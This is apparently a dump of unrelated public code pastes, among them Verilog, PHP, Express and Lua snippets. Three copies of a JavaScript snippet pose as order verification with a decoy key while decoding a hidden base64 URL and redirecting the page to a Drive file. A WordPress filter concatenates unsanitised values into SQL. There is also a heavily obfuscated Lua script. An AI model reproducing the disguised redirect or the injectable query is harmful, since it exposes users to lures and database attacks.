                D = 0;

            #10 A = 0;        
                   B = 1;
                C = 0;
                D = 0;

            #10 A = 1;        
                   B = 1;
                C = 0;
                D = 0;

            #10 A = 0;        
                   B = 0;
                C = 1;
                D = 0;

            #10 A = 1;        
                   B = 0;
                C = 1;
                D = 0;

            #10 A = 0;        
                   B = 1;
                C = 1;
                D = 0;
                  
            #10 A = 1;        
                   B = 1;
                C = 1;
                D = 0;

            #10 A = 0;        
                   B = 0;
                C = 0;
                D = 1;
                  
            // This is an incomplete test. Try to
            // modify it to test all input combinations.    
      end
      
endmodule"
KAqexYKn,History sort by ticket number,wpgenie,PHP,Tuesday 25th of March 2025 08:23:42 AM CDT,"add_filter( 'woocomerce_lottery_history', 'woocomerce_lottery_history_sort_by_ticket_number', 15 , 4 );

function woocomerce_lottery_history_sort_by_ticket_number( $history, $product_id, $user_id, $relisteddate ){
		global $wpdb;
		$wheredatefrom = '';
		$datefrom      = FALSE;
		$relisteddate  = get_post_meta( $product_id, '_lottery_relisted', true );
		if(!is_admin() && !empty($relisteddate)){
		    $datefrom = $relisteddate;
		}
		if($datefrom){
		    $wheredatefrom ="" AND CAST(date AS DATETIME) > '$datefrom' "";
		}
		if($user_id){
		    $wheredatefrom ="" AND wc_lottery_log.userid = $user_id"";
		}
		$history = $wpdb->get_results( 'SELECT * FROM '.$wpdb->prefix.'wc_lottery_log LEFT JOIN '.$wpdb->prefix.'wc_lottery_pn_log on '.$wpdb->prefix.'wc_lottery_log.id = '.$wpdb->prefix.'wc_lottery_pn_log.log_id WHERE '.$wpdb->prefix.'wc_lottery_log.lottery_id =' . $product_id . $wheredatefrom.' ORDER BY `ticket_number` ASC');
		return $history;
}
"
nWGpyVD1,Handlebars app,MCreeper12731,JavaScript,Tuesday 25th of March 2025 08:21:07 AM CDT,"import express from 'express';
import { dirname, join } from ""path"";
import { fileURLToPath } from ""url"";

const __dirname = dirname(fileURLToPath(import.meta.url));

const app = express();

app.set('view engine', 'hbs');
app.set('views', join(__dirname, 'views'));
app.use(express.static(join(__dirname, ""public"")));

// Definicija poti - app.get()


app.listen(3000, () => {
    console.log('Server is running at http://localhost:3000');
});"
hTzi7R1V,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 08:16:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/610/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
r67NbGF3,Untitled,kele666CN,Lua,Tuesday 25th of March 2025 08:09:28 AM CDT,"([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _toAyXaiteSKW = a; end)); return(function(u,...)local r;local f;local o;local d;local t;local s;local e=24915;local n=0;local l={};while n<956 do n=n+1;while n<0x2cb and e%0x4598<0x22cc do n=n+1 e=(e*943)%5472 local a=n+e if(e%0x2876)>0x143b then e=(e+0x3d7)%0x277f while n<0x143 and e%0x3cb4<0x1e5a do n=n+1 e=(e-768)%27801 local a=n+e if(e%0x2012)<=0x1009 then e=(e+0x19d)%0x7ce7 local e=22509 if not l[e]then l[e]=0x1 f=""\4\8\116\111\110\117\109\98\101\114\90\77\103\81\71\90\115\83\0\6\115\116\114\105\110\103\4\99\104\97\114\97\73\122\72\82\109\82\72\0\6\115\116\114\105\110\103\3\115\117\98\109\111\88\113\121\95\97\119\0\6\115\116\114\105\110\103\4\98\121\116\101\114\107\107\110\65\76\77\99\0\5\116\97\98\108\101\6\99\111\110\99\97\116\111\82\76\66\118\72\72\74\0\5\116\97\98\108\101\6\105\110\115\101\114\116\104\108\68\89\87\85\74\105\5"";end elseif e%2~=0 then e=(e+0x13b)%0xbc58 local e=91217 if not l[e]then l[e]=0x1 d=function(d)local e=0x01 local function l(n)e=e+n return d:sub(e-n,e-0x01)end while true do local n=l(0x01)if(n==""\5"")then break end local e=r.byte(l(0x01))local e=l(e)if n==""\2""then e=o.ZMgQGZsS(e)elseif n==""\3""then e=e~=""\0""elseif n==""\6""then t[e]=function(e,n)return u(8,nil,u,n,e)end elseif n==""\4""then e=t[e]elseif n==""\0""then e=t[e][l(r.byte(l(0x01)))];end local n=l(0x08)o[n]=e end end end else e=(e-0xec)%0x19a7 n=n+1 local e=71475 if not l[e]then l[e]=0x1 s=tonumber;end end end elseif e%2~=0 then e=(e-0x19d)%0x1145 while n<0x245 and e%0x4164<0x20b2 do n=n+1 e=(e+368)%20787 local d=n+e if(e%0x1284)>=0x942 then e=(e-0x53)%0x35a2 local e=62007 if not l[e]then l[e]=0x1 o={};end elseif e%2~=0 then e=(e*0x20b)%0x554d local e=32700 if not l[e]then l[e]=0x1 r=string;end else e=(e*0x135)%0x222b n=n+1 local e=29788 if not l[e]then l[e]=0x1 t=getfenv and getfenv();end end end else e=(e+0xf5)%0xa30b n=n+1 while n<0x12c and e%0x2998<0x14cc do n=n+1 e=(e+23)%22206 local d=n+e if(e%0x3b3c)<0x1d9e then e=(e+0x205)%0x77af local e=7915 if not l[e]then l[e]=0x1 t=(not t)and _ENV or t;end elseif e%2~=0 then e=(e+0x32b)%0xaf1 local e=54832 if not l[e]then l[e]=0x1 end else e=(e*0x210)%0x1bde n=n+1 local e=25351 if not l[e]then l[e]=0x1 end end end end end e=(e-230)%47541 end d(f);local n={};for e=0x0,0xff do local l=o.aIzHRmRH(e);n[e]=l;n[l]=e;end local function c(e)return n[e];end local r=(function(a,r)local f,l=0x01,0x10 local n={{},{},{}}local t=-0x01 local e=0x01 local d=a while true do n[0x03][o.moXqy_aw(r,e,(function()e=f+e return e-0x01 end)())]=(function()t=t+0x01 return t end)()if t==(0x0f)then t=""""l=0x000 break end end local t=#r while e<t+0x01 do n[0x02][l]=o.moXqy_aw(r,e,(function()e=f+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 o.hlDYWUJi(n[0x01],(c((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+d)%0x100)));d=a+d;end end return o.oRLBvHHJ(n[0x01])end);d(r(10,""{NvwKpE83%X72Czii7""));d(r(4,""Bjp^E5L_T(rCI+HWWIWHL_LE5H5j5pE_HD^IE(^+^IArv(pCjj0WppW^HWrIr(j*WWW(vaWIW+W^++I+Ho+ICC+IL+L++E+pI5ILIT(+C_(ETLC^T+_+rT^d^p(C(T(pT5TL_Cj5_(L(_TL^LE^(ELET5p^I^IpL5j+T+T^+p+^IpII5pTjIj(pTjID(fWW62HsCW+WrHCTI(KW^HjHIHj+5HMI(+TIjCHIEC(CIIpIpC(TCTjrIrC^E^^_HT(T^(*T_TLE^LWLp_+5rEIE_EILTW!HI5CEjE5EIELpWjEEppHG_p^p(CLCjH5jrj5zEH(W=W(WH+HTITIWEHCHCHTHp+5+LICCur^IECICLrWC^CCE*EjrI(5(p(TT+pr(5TrTT_5_^__55_j_LECLIETL_E^HIHr55ErET^5^^^_jp^_p5WHbWpHj5j+rIr(jYQHNj1p=E+EHfW(HWH_HEIsH(_8LH+_I5ITC+C_IE(jTrrr(jT(TjrL__pIpI(jTj(NTZj(_L_T___^_pLT5W5r^j^HEI^(^_Hj""));local e=(-25675+(function()local d,l=0,1;(function(n,e,t,l)e(e(e,e,n and e,l),e(l,n and e,t,e),e(l,n,t,e),e(n,n,e,l))end)(function(o,t,n,e)if d>277 then return o end d=d+1 l=(l*678)%44870 if(l%318)>159 then l=(l+614)%36391 return n(e(e,n and t,e,e),n(t,n,e,n),e(n,e,e,n),e(e,e,n,t))else return e end return t end,function(o,t,n,e)if d>436 then return o end d=d+1 l=(l-659)%26100 if(l%312)<=156 then return e(n(e,e,e,n),t(e,e,o,t),e(t,n,n,t),t(o,t,n,n))else return o end return o end,function(e,n,o,t)if d>212 then return e end d=d+1 l=(l-28)%39589 if(l%1354)<677 then return o(n(e and n,t,o,n),t(t,e,e,t),n(o,t,e and t,n and o),e(e,n,n and o,e))else return e end return o end,function(o,t,n,e)if d>216 then return e end d=d+1 l=(l+102)%26917 if(l%1814)<=907 then l=(l+92)%48968 return n else return n(o(e and e,o,e,e),e(e,o,o,n),o(o and n,e and t,n,t),n(e,t,o,n)and e(o,e,n,t))end return t(e(n,o,t and e,o)and t(t,t,n,n),e(n and t,n,t,t),e(n,e,e,t and n),e(n,t,e,e)and t(n,e,t,e))end)return l;end)())local h=o.JseBWzeq or o.MmvOtTwW;local ne=(getfenv)or(function()return _ENV end);local d=2;local ee=1;local f=4;local t=3;local function y(b,...)local c=r(e,""PJ2;ifTa #>Fx8+6f#>i6Ti #F6#;+#A+2#;6>iaTF6f2T J8F; aFFFHfT;f68a52fi>TixF2bfTJT)6 i8>2+86>>;86i;i2+i;  a8+2JaJ8iJaT aTJ6T;xALTJe 6=;ff>T88iJ#J>E2 faaax6J>TxF+f 8T2 aT#6z6aNi6>>62ii#Tfi>#+8i2>;6TiT 6+T;JJ8a2xSJ2TiJ8T#xaJJ66T#>26iiT+ff#>F6x;;#a+a;faF++;+ a8+2# a>+2JT+x^J;T+#;J T>F>#FD8;+#N+2#x6>ix#>+6) i6>J;iaa8F2+aJxgJ#aM 2S#TaFaxFT<>JC#J; #68fJ 8xL;FTi> 8iJ T>Fx:+TiF24ifT>#6>ix#+N2fJ#i+T; #n8x2+ <+i;JaTx J>T8F+JGT28>J2f >>6xfi>)6;ii# + ;+>J8+;3 28>2Ta#x>Jxaix^J2TiFa, f>>xJcf>>26iiT#x+>;x +62;# i8a2 a6xxJ+aU+22 TTF#:>f8>+!;f2FTJ;i #8+xif#*+2;i T622>a8x+2;a2xiJTT x+zxf+FX_2fi> 6 i>>;++iA#2+f;T #8>2x#J8122aixaJ T>FxO+T^F25ifT"");local n=0;o.qkYMddGl(function()o.r_HzjGgq()n=n+1 end)local function e(l,e)if e then return n end;n=l+n;end local l,n,a=u(0,u,e,c,o.rkknALMc);local function r()local n,l=o.rkknALMc(c,e(1,3),e(5,6)+2);e(2);return(l*256)+n;end;local _=true;local _=0 local function j()local t=n();local e=n();local d=1;local t=(l(e,1,20)*(2^32))+t;local n=l(e,21,31);local e=((-1)^l(e,32));if(n==0)then if(t==_)then return e*0;else n=1;d=0;end;elseif(n==2047)then return(t==0)and(e*(1/0))or(e*(0/0));end;return o.akPrsij_(e,n-1023)*(d+(t/(2^52)));end;local k=n;local function p(n)local l;if(not n)then n=k();if(n==0)then return'';end;end;l=o.moXqy_aw(c,e(1,3),e(5,6)+n-1);e(n)local e=""""for n=(1+_),#l do e=e..o.moXqy_aw(l,n,n)end return e;end;local _=#o.PGlhfckw(s('\49.\48'))~=1 local e=n;local function g(...)return{...},o.EBfQMIrG('#',...)end local function m()local s={};local u={};local e={};local h={u,s,nil,e};local e=n()local c={}for t=1,e do local l=a();local n;if(l==3)then n=(a()~=#{});elseif(l==2)then local e=j();if _ and o.ARXfTXFu(o.PGlhfckw(e),'.(\48+)$')then e=o.lgfARdUW(e);end n=e;elseif(l==1)then n=p();end;c[t]=n;end;for h=1,n()do local e=a();if(l(e,1,1)==0)then local o=l(e,2,3);local a=l(e,4,6);local e={r(),r(),nil,nil};if(o==0)then e[t]=r();e[f]=r();elseif(o==#{1})then e[t]=n();elseif(o==b[2])then e[t]=n()-(2^16)elseif(o==b[3])then e[t]=n()-(2^16)e[f]=r();end;if(l(a,1,1)==1)then e[d]=c[e[d]]end if(l(a,2,2)==1)then e[t]=c[e[t]]end if(l(a,3,3)==1)then e[f]=c[e[f]]end u[h]=e;end end;for e=1,n()do s[e-(#{1})]=m();end;h[3]=a();return h;end;local function y(l,n,e)local t=n;local t=e;return s(o.ARXfTXFu(o.ARXfTXFu(({o.qkYMddGl(l)})[2],n),e))end local function z(p,e,a)local function m(...)local r,z,s,y,b,n,c,k,_,j,m,l;local e=0;while-1<e do if e<3 then if e<=0 then r=u(6,78,1,82,p);z=u(6,74,2,2,p);else if e>=-2 then for l=26,55 do if e~=1 then n=-41;c=-1;break;end;s=u(6,23,3,95,p);b=g y=0;break;end;else s=u(6,23,3,95,p);b=g y=0;end end else if e>4 then if 4<=e then repeat if e~=6 then l=u(7);break;end;e=-2;until true;else l=u(7);end else if 1<=e then for n=49,82 do if e<4 then k={};_={...};break;end;j=o.EBfQMIrG('#',...)-1;m={};break;end;else k={};_={...};end end end e=e+1;end;for e=0,j do if(e>=s)then k[e-s]=_[e+1];else l[e]=_[e+1];end;end;local e=j-s+1 local e;local o;local function u(...)while true do end end while true do if n<-40 then n=n+42 end e=r[n];o=e[ee];if 12>o then if o>5 then if 9>o then if o<7 then do return end;else if o>3 then for u=28,59 do if o>7 then if(l[e[d]]~=e[f])then n=n+1;else n=e[t];end;break;end;local o,s,p,_,u;l[e[d]]=a[e[t]];n=n+1;e=r[n];o=e[d];s=l[e[t]];l[o+1]=s;l[o]=s[e[f]];n=n+1;e=r[n];l(e[d],e[t]);n=n+1;e=r[n];o=e[d]p,_=b(l[o](h(l,o+1,e[t])))c=_+o-1 u=0;for e=o,c do u=u+1;l[e]=p[u];end;n=n+1;e=r[n];o=e[d]l[o]=l[o](h(l,o+1,c))n=n+1;e=r[n];l[e[d]]();n=n+1;e=r[n];do return end;break;end;else if(l[e[d]]~=e[f])then n=n+1;else n=e[t];end;end end else if o>9 then if o>6 then for r=16,57 do if o<11 then l[e[d]]=a[e[t]];break;end;if(l[e[d]]~=e[f])then n=n+1;else n=e[t];end;break;end;else l[e[d]]=a[e[t]];end else local e=e[d]l[e]=l[e](h(l,e+1,c))end end else if o<=2 then if 0<o then if 1~=o then a[e[t]]=l[e[d]];else l[e[d]]=(e[t]~=0);end else local d=e[d];local n=l[e[t]];l[d+1]=n;l[d]=n[e[f]];end else if o<=3 then l[e[d]]();else if 1<=o then for c=25,89 do if o~=4 then do return end;break;end;for o=0,3 do if o<=1 then if o>0 then a[e[t]]=l[e[d]];n=n+1;e=r[n];else l[e[d]]=(e[t]~=0);n=n+1;e=r[n];end else if o>-2 then repeat if 2~=o then if(l[e[d]]~=e[f])then n=n+1;else n=e[t];end;break;end;l[e[d]]=a[e[t]];n=n+1;e=r[n];until true;else if(l[e[d]]~=e[f])then n=n+1;else n=e[t];end;end end end break;end;else for o=0,3 do if o<=1 then if o>0 then a[e[t]]=l[e[d]];n=n+1;e=r[n];else l[e[d]]=(e[t]~=0);n=n+1;e=r[n];end else if o>-2 then repeat if 2~=o then if(l[e[d]]~=e[f])then n=n+1;else n=e[t];end;break;end;l[e[d]]=a[e[t]];n=n+1;e=r[n];until true;else if(l[e[d]]~=e[f])then n=n+1;else n=e[t];end;end end end end end end end else if 18>o then if 15<=o then if o>=16 then if 14~=o then repeat if o~=17 then l(e[d],e[t]);break;end;n=e[t];until true;else n=e[t];end else local n=e[d]local t,e=b(l[n](h(l,n+1,e[t])))c=e+n-1 local e=0;for n=n,c do e=e+1;l[n]=t[e];end;end else if o>12 then if o>12 then repeat if 14~=o then a[e[t]]=l[e[d]];break;end;l[e[d]]=a[e[t]];until true;else l[e[d]]=a[e[t]];end else local d=e[d];local n=l[e[t]];l[d+1]=n;l[d]=n[e[f]];end end else if 20>=o then if 18>=o then l[e[d]]=(e[t]~=0);else if o<20 then local e=e[d]l[e]=l[e](h(l,e+1,c))else local n=e[d]local t,e=b(l[n](h(l,n+1,e[t])))c=e+n-1 local e=0;for n=n,c do e=e+1;l[n]=t[e];end;end end else if o<22 then n=e[t];else if o>=20 then repeat if 23>o then l[e[d]]();break;end;local o,a,f,r,c;local n=0;while n>-1 do if 3>n then if 0>=n then o=e;else if n>1 then f=t;else a=d;end end else if n<5 then if 2<n then for e=49,62 do if n>3 then c=o[a];break;end;r=o[f];break;end;else r=o[f];end else if 1~=n then for e=33,62 do if 6~=n then l(c,r);break;end;n=-2;break;end;else n=-2;end end end n=n+1 end until true;else l[e[d]]();end end end end end n=1+n;end;end;return m end;local t=0xff;local c={};local r=(1);local d='';(function(n)local l=n local f=0x00 local e=0x00 l={(function(o)if f>0x24 then return o end f=f+1 e=(e+0x657-o)%0xd return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x15);end return true end)'cxFgi'and l[0x1](0x12e+o))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x8b);end return true end)'VHySs'and l[0x3](o+0x1f7))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xc6);d='\37';t={function()t()end};d=d..'\100\43';end return true end)'WcYqP'and l[0x2](o+0x36d))or o end),(function(a)if f>0x26 then return a end f=f+1 e=(e+0x97b-a)%0xa return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x2e);c[r]=ne();r=r+t;end return true end)'yAEyt'and l[0x1](0x262+a))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x62);end return true end)'noioX'and l[0x2](a+0x332))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xc3);d={d..'\58 a',d};c[r]=m();r=r+((not o.BEkUWnCC)and 1 or 0);d[1]='\58'..d[1];t[2]=0xff;end return true end)'XVzpM'and l[0x3](a+0xc2))or a end),(function(o)if f>0x2c then return o end f=f+1 e=(e+0x1320-o)%0x4f return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xad);end return true end)'SjXbA'and l[0x1](0x2bc+o))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x71);t[2]=(t[2]*(y(function()c()end,h(d))-y(t[1],h(d))))+1;c[r]={};t=t[2];r=r+t;end return true end)'pkFUs'and l[0x2](o+0x222))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x28);end return true end)'pHdQV'and l[0x3](o+0x3c3))or o end)}l[0x1](0xb13)end){};local e=z(h(c));return e(...);end return y((function()local n={}local e=0x01;local l;if o.BEkUWnCC then l=o.BEkUWnCC(y)else l=''end if o.ARXfTXFu(l,o.MkLBsQEt)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(l,e,n,t,d,o)local o;if 3>=l then if 2>l then if l>-3 then for o=37,85 do if l>0 then do return function(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;end;break;end;do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;break;end;else do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;end else if l~=-1 then for o=33,98 do if l~=3 then do return 16777216,65536,256 end;break;end;do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;break;end;else do return e(1),e(4,d,t,n,e),e(5,d,t,n)end;end end else if 6<=l then if l<7 then do return d[n]end;else if 7==l then do return setmetatable({},{['__\99\97\108\108']=function(e,d,t,l,n)if n then return e[n]elseif l then return e else e[d]=t end end})end else do return n(l,nil,n);end end end else if l>0 then for o=40,58 do if l~=5 then local l=t;local d,t,o=d(2);do return function()local f,e,n,r=e(n,l(l,l),l(l,l)+3);l(4);return(r*d)+(n*t)+(e*o)+f;end;end;break;end;local l=t;do return function()local e=e(n,l(l,l),l(l,l));l(1);return e;end;end;break;end;else local l=t;do return function()local e=e(n,l(l,l),l(l,l));l(1);return e;end;end;end end end end),...)"
VPSM4bcD,Untitled,Koridev,Lua,Tuesday 25th of March 2025 08:04:26 AM CDT,"-- client.lua
-- AE2-Client, empfängt Daten per rednet und zeigt AE2 UI an

-------------------------
-- 1) KONFIG
-------------------------
local monSide     = ""right""      -- Monitor-Seite
local modemSide   = ""top""       -- Wireless Modem-Seite
local BOX_W       = 14           -- Breite Kästchen
local BOX_H       = 4            -- Höhe Kästchen
local ITEMS_PER_PAGE   = 10      -- Items in Detailansicht
local REDNET_PROTOCOL  = ""AE2_DATA""  -- Muss zum Server passen
local DATA_TIMEOUT     = 15      -- Sekunden, bis wir ""keine Daten"" anzeigen

-------------------------
-- 2) Peripherie-Abfrage
-------------------------
local mon = peripheral.wrap(monSide)
if not mon then
  error(""Monitor an Seite '""..monSide..""' nicht gefunden!"")
end

local modem = peripheral.wrap(modemSide)
if not modem then
  error(""Modem an Seite '""..modemSide..""' nicht gefunden!"")
end
rednet.open(modemSide)

mon.setTextScale(0.5)

-------------------------
-- 3) Globale Variablen
-------------------------
local width, height = mon.getSize()
local currentScreen = ""main""
local currentPage   = 1

-- Daten vom Server
local serverData = {
  cells       = {},  -- { {usedBytes=..., totalBytes=...}, ... }
  itemCount   = 0,
  freePercent = 0,
  items       = {},  -- Komplette Liste (sortiert)
}

-------------------------
-- 4) Hilfsfunktionen
-------------------------
local function clear()
  mon.setBackgroundColor(colors.black)
  mon.clear()
  mon.setCursorPos(1,1)
end

local function centerText(y, text, color)
  color = color or colors.white
  mon.setTextColor(color)
  local x = math.floor((width - #text) / 2)
  mon.setCursorPos(x+1, y)
  mon.write(text)
end

local function getColorForUsage(used, total)
  if total == 0 then
    return colors.lime
  end
  local percent = used / total
  if percent >= 0.9 then
    return colors.red
  elseif percent >= 0.5 then
    return colors.yellow
  else
    return colors.lime
  end
end

-------------------------
-- 4.1) Box-Zeichnung (Cell UI)
-------------------------
local function drawCellBox(x, y, w, h, cellIndex, usedB, totalB)
  mon.setCursorPos(x, y)
  mon.setTextColor(colors.white)
  mon.write(""+"")
  for i = 1, w-2 do
    mon.write(""-"")
  end
  mon.write(""+"")

  for row = 1, h-2 do
    mon.setCursorPos(x, y+row)
    mon.write(""|"")
    mon.setCursorPos(x+w-1, y+row)
    mon.write(""|"")
  end

  mon.setCursorPos(x, y+h-1)
  mon.write(""+"")
  for i = 1, w-2 do
    mon.write(""-"")
  end
  mon.write(""+"")

  -- Info
  mon.setCursorPos(x+1, y+1)
  mon.setTextColor(colors.white)
  mon.write(""Cell ""..cellIndex)

  local percent = 0
  if totalB > 0 then
    percent = math.floor((usedB / totalB)*100)
  end
  local usageColor = getColorForUsage(usedB, totalB)
  mon.setTextColor(usageColor)
  mon.setCursorPos(x+1, y+2)
  mon.write(usedB..""/""..totalB.."" (""..percent..""%)"")
end

-------------------------
-- 5) Hauptmenü zeichnen
-------------------------
local function drawMainScreen()
  clear()
  centerText(1, ""AE2 Cells Overview (Page ""..currentPage.."")"", colors.cyan)

  local cells = serverData.cells or {}
  local columns = math.floor(width / BOX_W)
  local rows    = math.floor((height - 3) / BOX_H)

  if columns < 1 or rows < 1 then
    centerText(math.floor(height/2), ""Monitor zu klein!"", colors.red)
    return
  end

  local boxesPerPage = columns * rows
  local totalCells   = #cells
  local totalPages   = math.ceil(totalCells / boxesPerPage)

  -- ""globale"" totalPages Updaten, damit wir blättern können
  _G.totalPages = totalPages

  local startCell = (currentPage - 1)*boxesPerPage + 1
  local endCell   = math.min(startCell + boxesPerPage - 1, totalCells)

  local idx = startCell
  for row=0, rows-1 do
    for col=0, columns-1 do
      if idx > endCell then break end
      local c = cells[idx]
      local usedB  = c.usedBytes  or 0
      local totalB = c.totalBytes or 0

      local x = col*BOX_W + 1
      local y = row*BOX_H + 2
      drawCellBox(x, y, BOX_W, BOX_H, idx, usedB, totalB)
      idx = idx + 1
    end
    if idx > endCell then break end
  end

  -- Infozeile (Cells, Items, Frei)
  mon.setCursorPos(2, height-1)
  mon.setTextColor(colors.white)
  local msg = string.format(""Cells: %d  Items: %d  Frei: %d%%"",
    #cells, serverData.itemCount, serverData.freePercent)
  mon.write(msg)

  -- Seitenbuttons
  mon.setCursorPos(2, height)
  if currentPage > 1 then
    mon.write(""[ < ]"")
  end
  mon.setCursorPos(width-5, height)
  if currentPage < totalPages then
    mon.write(""[ > ]"")
  end
end

-------------------------
-- 5.1) Detail-Items
-------------------------
local function drawCellDetails(cellIndex)
  clear()
  centerText(1, ""Cell ""..cellIndex.."" - Top Items"", colors.cyan)

  local items = serverData.items or {}
  local y = 3
  local shown = 0

  for _, it in ipairs(items) do
    if y >= height then break end
    mon.setCursorPos(2, y)
    mon.setTextColor(colors.white)
    mon.write((it.displayName or ""?"").."": ""..(it.amount or 0))
    y = y + 1
    shown = shown + 1
    if shown >= ITEMS_PER_PAGE then
      break
    end
  end

  mon.setCursorPos(2, height)
  mon.setTextColor(colors.gray)
  mon.write(""[ Zurueck ]"")
end

-------------------------
-- 6) Klick -> Welche Cell?
-------------------------
local function getCellIndexFromClick(x, y)
  local cells = serverData.cells or {}
  local columns = math.floor(width / BOX_W)
  local rows    = math.floor((height - 3) / BOX_H)
  local boxesPerPage = columns * rows

  local totalCells = #cells
  local totalPages = math.ceil(totalCells / boxesPerPage)
  _G.totalPages = totalPages  -- for global reference

  local startCell = (currentPage - 1)*boxesPerPage + 1
  local endCell   = math.min(startCell + boxesPerPage - 1, totalCells)

  local col = math.floor((x-1)/BOX_W)
  local row = math.floor((y-2)/BOX_H)
  if col<0 or col>=columns or row<0 or row>=rows then
    return nil
  end

  local cellOffset = row*columns + col
  local actualIndex = startCell + cellOffset
  if actualIndex <= endCell then
    return actualIndex
  end
  return nil
end

-------------------------
-- 7) Haupt-Loop
-------------------------
local refreshTimer = os.startTimer(1) -- alle 1s checken, ob neue Daten reingekommen sind

-- Wir speichern Zeitstempel, wann wir zuletzt Daten erhielten
local lastDataTime = os.epoch(""utc"")

-- Wir zeigen init
drawMainScreen()

while true do
  local event, p1, p2, p3, p4 = os.pullEvent()

  if event == ""rednet_message"" then
    local senderID, message, protocol = p1, p2, p3
    if protocol == REDNET_PROTOCOL and type(message)==""table"" then
      -- Neue Daten vom Server
      serverData = message
      lastDataTime = os.epoch(""utc"")
      if currentScreen == ""main"" then
        drawMainScreen()
      end
    end

  elseif event == ""monitor_touch"" then
    local x, y = p2, p3
    if currentScreen == ""main"" then
      -- Blättern?
      if y == height then
        if x>=2 and x<=5 and currentPage>1 then
          currentPage = currentPage - 1
          drawMainScreen()
        elseif x>=width-4 and x<=width and currentPage<_G.totalPages then
          currentPage = currentPage + 1
          drawMainScreen()
        end
      else
        -- Klick auf Cell => Detail
        local cellIndex = getCellIndexFromClick(x,y)
        if cellIndex then
          currentScreen = ""cell""
          drawCellDetails(cellIndex)
        end
      end
    elseif currentScreen == ""cell"" then
      -- Klick auf [Zurueck]
      if y == height then
        currentScreen = ""main""
        drawMainScreen()
      end
    end

  elseif event == ""timer"" then
    if p1 == refreshTimer then
      -- Prüfe, ob wir zu lange keine Daten hatten
      local now = os.epoch(""utc"")
      if now - lastDataTime > (DATA_TIMEOUT*1000) then
        -- Zu lange keine Daten => Anzeige leeren
        clear()
        centerText(math.floor(height/2), ""Keine Daten vom Server!"", colors.red)
      end
      refreshTimer = os.startTimer(1) -- Timer neu
    end
  end
end
"
4m9gnSXR,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 08:04:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/018/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RAFK6y9Y,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 07:52:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/024/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

